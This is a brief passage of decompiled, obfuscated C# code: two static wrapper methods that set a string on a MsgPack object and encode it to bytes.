	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void g7NSf9hxfsDIBsvZ0VU(object P_0, object P_1)
	{
		((MsgPack)P_0).AsString = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object x5hRNFhUsiMI14gteRg(object P_0)
	{
		return ((MsgPack)P_0).Encode2Bytes();
	}
}
